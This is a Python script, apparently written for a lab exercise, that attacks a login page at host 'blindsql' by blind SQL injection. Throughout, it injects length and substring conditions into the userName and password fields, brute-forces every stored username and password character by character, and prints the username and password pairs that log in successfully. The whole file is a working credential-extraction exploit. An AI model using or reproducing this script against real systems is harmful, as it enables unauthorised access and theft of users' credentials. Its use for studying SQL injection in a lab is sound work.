#!/usr/bin/python3
# Owen Siebert
import requests
import itertools as iter
from string import ascii_letters
from string import digits
import code
from urllib.request import urlopen
from bs4 import BeautifulSoup
from bs4 import Comment
import sys, getopt

MAX_FIELD_LENGTH = 24



"""
Function: get_answer
Parameters: params - username and password fields to check on website
Returns: True - returns when username and password successfully authenticate
         False - returns when username and password fail authentication 
Description: This function passes the given parameters to the website 
             and parses the site to determine whether or not the authentication
             was successful.
"""
def get_answer(params):
    r = requests.post('http://blindsql/blind/login.php',data=params)
    bsObj = BeautifulSoup(r.text, "lxml")
    if bsObj.find('div', {'class':'message'}).text == "You are successfully authenticated!":
        return True
    else:
        return False



"""
Function: getUsers
Paramaters: max_length - The maximum lenght of username to check
Returns: doneUsers - A list of users in a database that are less than or equal to in length to the
                     given parameter

Description: This function cycles through all possibilities for usernames on the target website
             with lowercase charecters and numbers. It first checks for all possible numbers and 
             letters as the first charecter, then only checks for substrings that have returned 
             true for existing in the database.
"""
def getUsers(max_length):
    partialUsers = []
    doneUsers = []

    # loop through 1-9 and a-z and check if the first charecter returns true
    # and the username lenght is one, it stores it in doneUsers if its length
    # is != 1, but is still the first char of a user it  gets appended t0
    # partialUsers 
    for i in iter.chain(range(48,58), range(97, 123)):
        params = {'userName': "' or length(username)=1 and substring(userName, 1, 1)=" +
                                    '\"' + str(chr(i)) + '\"' + " -- '", 'password': ''}
        if get_answer(params):
            doneUsers.append(str(chr(i)))
        params = {'userName': "' or length(username)!=1 and substring(userName, 1, 1)=" + 
                                    '\"' + str(chr(i)) + '\"' + " -- '", 'password': ''}
        if get_answer(params):
            partialUsers.append(str(chr(i)))

    # This loops through the rest of the charecters up to max_length for each
    # partial username in partial users. It checks through all possible next
    # charecters. If it returns true and the length is the same as the 
    # current length, it is placed in doneUsers. If the length is greater
    # than the current, its is added to partialUsers
    for x in range(1, max_length + 1):
        for word in partialUsers:
            for i in iter.chain(range(48,58), range(97, 123)):
                params = {'userName': "' or length(userName)!=" + str(x) + 
                        " and substring(userName, 1, " + str(x) + ")=" + '\"' +
                         word + str(chr(i)) + '\"' + " -- '", 'password': ''}
                if get_answer(params):
                    partialUsers.append(word + str(chr(i)))
                params = {'userName': "' or length(userName)=" + str(x) + 
                        " and substring(userName, 1, " + str(x) + ")=" + '\"' + 
                        word + str(chr(i)) + '\"' + " -- '", 'password': ''}
                if get_answer(params):
                    if str(word + str(chr(i))) not in doneUsers:
                        doneUsers.append(word + str(chr(i)))
                
    return doneUsers

"""
Function: getPasswords
Paramaters: max_length - The maximum lenght of username to check
Returns: doneUsers - A list of passwords in a database that are less than or equal to in length 
                     to the given parameter
Description: This function is fundamentally the same as the getUsers function, with the only 
             difference being that it checks for passwords instead of users.
"""
def getPasswords(max_length):
    partial = []
    done = []
    
    # loop through 1-9 and a-z and check if the first charecter returns true
    # and the password length is one, it stores it in doneUsers if its length
    # is != 1, but is still the first char of a password it gets appended t0
    # partial
    for i in iter.chain(range(48,58), range(97, 123)):
        params = {'username': '', 'password': "' or length(password)=1 and substring(password, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '"}
        if get_answer(params):
            done.append(str(chr(i)))
        params = {'username': '', 'password': "' or length(password)!=1 and substring(password, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '"}
        if get_answer(params):
            partial.append(str(chr(i)))

    # This loops through the rest of the charecters up to max_length for each
    # partial password in partial. it checks through all possible next
    # charecters. If it returns true and the length is the same as the 
    # current length, it is placed in done. If the length is greater
    # than the current, its is added to partial
    for x in range(1, max_length + 1):
        for word in partial:
            for i in iter.chain(range(48,58), range(97, 123)):
                params = {'username': '', 'password': "' or length(password)="+
                        str(x) + " and substring(password, 1, " + str(x) + " )=" + 
                        '\"' + word + str(chr(i)) + '\"' + " -- '"}
                if get_answer(params):
                    done.append(word + str(chr(i)))
                params = {'username': '', 'password': "' or length(password)!="+
                        str(x) + " and substring(password, 1, " + str(x) + " )=" +
                        '\"' + word + str(chr(i)) + '\"' + " -- '"}
                if get_answer(params):
                    partial.append(word + str(chr(i)))

    return done


"""
Function: matchPasswords
Parameters: users - a list of known users in the target database
            passwords - a list of known passwords in the target database
Returns: none
Description: This function takes lists of known usernames and passwords and
             matches them based on successful authentications with the target
             database. If the combination authenticates, it prints out the 
             pair and removes them from the lists.

"""
def matchPasswords(users, passwords):

       for user in users:
           for password in passwords:
                params = {'userName': user, 'password': password}
                if get_answer(params):
                    print(user, ":", password) 
                    users.remove(user)
                    passwords.remove(password)
def main():
    users = getUsers(8)
    passwords = getPasswords(8)
    matchPasswords(users, passwords)
    
main()
